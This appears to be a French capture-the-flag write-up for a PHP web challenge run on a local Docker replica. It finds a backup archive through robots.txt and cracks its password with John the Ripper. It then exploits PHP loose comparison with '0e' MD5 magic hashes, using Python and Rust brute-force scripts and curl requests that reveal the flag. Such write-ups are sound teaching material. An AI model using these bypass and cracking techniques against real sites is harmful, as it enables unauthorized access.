## RTFM Challenge Qualifiers ##

# Challenge Web - Simple #

#### Note: Réplique locale du challenge ####

Joint à ce write-up se trouve un script docker pour lancer un serveur php "équivalent" à celui du challenge.
Pour le lancer, il suffit de:
```sh
$ ./run_server.sh
Sending build context to Docker daemon 9.728 kB
Step 1/8 : FROM debian:jessie-slim
[...]
Successfully built <image hash>
PHP 5.6.38-0+deb8u1 Development Server started at Fri Oct 12 23:07:37 2018
Listening on http://localhost:8080
Document root is /challenge
Press Ctrl-C to quit.
```
L'on peut désormais tester le challenge sur `http://localhost:8080`
```sh
# Browse to http://localhost:8080/
$ curl http://localhost:8080/
<html>
    <head>
        <title>Un site simple</title></title>
    </head>
    <body>
        <center><iframe width="560" height="315" src="https://www.youtube.com/embed/2bjk26RwjyU?rel=0&amp;controls=0&amp;showinfo=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></center>
<!-- Si une méthode ne fonctionne pas il faut en utiliser une autre -->
<!-- Un formulaire c'était pas assez simple donc on en a pas mis -->
</body>
</html>
```

# Solution
Ce challenge auto-proclamé "simple" a été l'un des plus difficiles pour moi.
En effet, il s'agissait initialement d'un étape de _guessing_ qu'il fallait réussir pour continuer.

## 1 - Le guessing
Ainsi, on essaye les classiques `/admin` et autres chemins, pour ne découvrir initialement que `index.php`.
J'ai essayé un grand nombre de requêtes GET et même POST, en vain.
Finalement, en tentant tout et n'importe quoi, j'essaie `/robots.txt`. Et là: `backup.zip` s'affiche !
On essaye `/backup.zip` et nous voilà avec le .zip téléchargé.
Cependant, le voilà chiffré.

## 2 - Le ZIP chiffré
C'est ici que je suis resté le plus longtemps bloqué, car il était indiqué que nul bruteforce était nécessaire, or j'avais beau songer à des idées / approches, le mdp du ZIP restait inconnu.
Finalement, qqun m'a dit que la règle du bruteforce ne s'appliquait pas en "offline", et j'ai alors pu tenter de "forcer le ZIP":

### John the Ripper - Installation
```sh
$ git clone https://github.com/magnumripper/JohnTheRipper && cd JohnTheRipper

$ apt install libssl-dev libz-dev

$ cd src && ./configure && make -j$(nproc) && cd ..
```

### John the Ripper - Crack de ZIP
```sh
$ run/zip2john ~/Downloads/backup.zip > hashfile
ver 2.0 efh 5455 efh 7875 backup.zip->index.php PKZIP Encr: 2b chk, TS_chk, cmplen=453, decmplen=680, crc=70C7CB88

$ run/john hashfile
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
passw0rd         (backup.zip)
1g 0:00:00:00 DONE 2/3 (2018-10-12 23:28) 1.428g/s 28640p/s 28640c/s 28640C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Ainsi le mdp est `passw0rd`. On en extrait un fichier `index.php` qui contient donc du code PHP intéressant

## 3 - La faile PHP de `index.php`
### PHP c'est la *loose*
Voici le contenu du fichier `index.php`:
```php
<?php
include "auth.php";
?>
<html>
    <head>
        <title>Un site simple</title></title>
    </head>
    <body>
        <center><iframe width="560" height="315" src="https://www.youtube.com/embed/2bjk26RwjyU?rel=0&amp;controls=0&amp;showinfo=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></center>
<?php
	if(isset($_POST["h1"]))
	{
		$h1 = md5($_POST["h1"] . "Shrewk");
		echo "h1 vaut: ".$h1."</br>";
		if($h1 == "0")
		{
				echo "<!--Bien joué le flag est ".$flag."-->";
		}
	}
?>
<!-- Si une méthode ne fonctionne pas il faut en utiliser une autre -->
<!-- Un formulaire c'était pas assez simple donc on en a pas mis -->
</body>
</html>
```
Ainsi, une entrée utilisateur (h1=... en POST) concaténée à "Shrewk" doit avoit un hash MD5 égal à "0".
Je sais bien que MD5 c'est pas top top niveau sécurité, mais trouver une préimage reste difficile.
Heureusement, c'est du PHP, quintessence du paradigme du Fuck Typing (If it quacks like a duck then it's whatever it has to be), et le `==` risque de faire n'imp.
En effet, dès les premières recherches on tombe sur la "loose equality".
En gros, PHP essaye de trouver caster/parser les deux membres comparés dans un type compatible pour les deux, et ne réalise qu'alors un test d'égalité strict.
Quels types avons-nous à notre disposition ? La _chaîne_ "0" peut être castée en tant qu'elle-même, évidemment, mais aussi en tant que le _nombre_ 0, évidemment ... je suppose.
Du coup, il faudrait que **notre hash puisse être casté en tant que _nombre_, et que ce nombre vaille 0**.

Pour les tests, j'utilise `php-cli` en mode intéractif:
```sh
$ php -a
Interactive mode enabled
php > echo "Hello Fuck Typing!";
Hello Fuck Typing!
php > if ("1e2" == "100") { echo "equal"; } else { echo "Not equal"; }
equal
php > 
```
Tiens tiens, PHP comprend la notation scientifique (le fameux E dans les calculatrices) ...
(Cette idée de la notation scientifique pour la loose equality est facilement trouvable sur le net, même si étonnamment mal présentée la plupart des fois)
Du coup, si on a une chaîne de la forme `0e456123...454654`, qu'importe le nombre décimal situé après le 0, le résultat restera 0: `0 * (10 ^ n) == 0 quel que soit n`.

### 3.1 Exploitation de la faille
Du coup les contraintes sur notre hash se sont relâchées *beaucoup*: il suffit qu'il commence par `0e` et qu'ensuite il n'y ait pas de lettres héxa.
Donc grosso modo nous sommes passés d'avoir une chance sur `2 ^ 128` de tomber pile sur un hash nul à une chance sur `2 ^ 8 * ((16/10) ^ 30)`:
```python
print 2 ** 128
# > 340282366920938463463374607431768211456L

print (2 ** 8) * (1.6 ** 30)
# > 340282366.920939
```

Voilà quelquechose qui peut être brute-forcé:
- (Même !) en Python (Mème?)
```python
from itertools import count
from hashlib import md5
for i in count():
	hash = memoryview(md5("%dShrewk" % (i, )).hexdigest())  # memoryview to avoid copying when slicing
	if hash[0:2] == "0e" and all(c.isdigit() for c in hash[2:]):
		break
print "md5('%dShrewk') = %s" % (i, hash.tobytes())
```
```sh
$ time python2.7 brute.py
md5('202900081Shrewk') = 0e079474607549029721268964015851

real	5m2.085s
user	5m1.684s
sys	0m0.312s
```

- en Rust (single-threaded)
```rust
extern crate md5;
/* Cargo.toml:
 * [dependencies]
 * md5 = "0.4.0"
 */

fn main () {
    println!("Solution found! {}", search_solution());
}

fn search_solution () -> usize
{
    (0 .. ::std::usize::MAX)
    .into_iter().find(|i| {
        let digest = format!(
            "{:x}",
            ::md5::compute(&format!("{}Shrewk", i)),
        );
        digest
            .starts_with("0e")
        &&
        digest[2..]
            .bytes()
            .all(|x| b'0' <= x && x <= b'9')
    })
    .expect("No solution was found")
}
```
```sh
$ cargo rustc --release -- -C opt-level=3 -C link-args="-flto"
[...]
$ time ./target/release/brute_rs_single_threaded
Solution found! 202900081

real	4m36.290s
user	4m35.680s
sys	0m0.292s
```

- en Rust (multi-threaded)
```rust
extern crate md5;
/* Cargo.toml:
 * [dependencies]
 * md5 = "0.4.0"
 * rayon = "1.0.2"  # NEW LINE
 */

extern crate rayon;      // NEW LINE
use ::rayon::prelude::*; // NEW LINE

fn main () {
    println!("Solution found! {}", search_solution());
}

fn search_solution () -> usize
{
    (0 .. ::std::usize::MAX)
    .into_par_iter().find_any(|i| {  // MODIFIED LINE
        let digest = format!(
            "{:x}",
            ::md5::compute(&format!("{}Shrewk", i)),
        );
        digest
            .starts_with("0e")
        &&
        digest[2..]
            .bytes()
            .all(|x| b'0' <= x && x <= b'9')
    })
    .expect("No solution was found")
}
```
```sh
$ cargo rustc --release -- -C opt-level=3 -C link-args="-flto"
[...]
$ time ./target/release/brute_rs_multi_threaded
Solution found! 13835058055408409033

real	5m24.294s
user	21m24.196s
sys	0m0.744s
```


### 3.2 Vérifier la solution
```sh
$ curl -X POST -d 'h1=202900081' http://localhost:8080
<html>
    <head>
        <title>Un site simple</title></title>
    </head>
    <body>
        <center><iframe width="560" height="315" src="https://www.youtube.com/embed/2bjk26RwjyU?rel=0&amp;controls=0&amp;showinfo=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></center>
h1 vaut: 0e079474607549029721268964015851</br><!--Bien joué le flag est sigsegv{...}--><!-- Si une méthode ne fonctionne pas il faut en utiliser une autre -->
<!-- Un formulaire c'était pas assez simple donc on en a pas mis -->
</body>
</html>

$ curl -X POST -d 'h1=13835058055408409033' http://localhost:8080
<html>
    <head>
        <title>Un site simple</title></title>
    </head>
    <body>
        <center><iframe width="560" height="315" src="https://www.youtube.com/embed/2bjk26RwjyU?rel=0&amp;controls=0&amp;showinfo=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></center>
h1 vaut: 0e842311579849773059823837277325</br><!--Bien joué le flag est sigsegv{...}--><!-- Si une méthode ne fonctionne pas il faut en utiliser une autre -->
<!-- Un formulaire c'était pas assez simple donc on en a pas mis -->
</body>
</html>
```
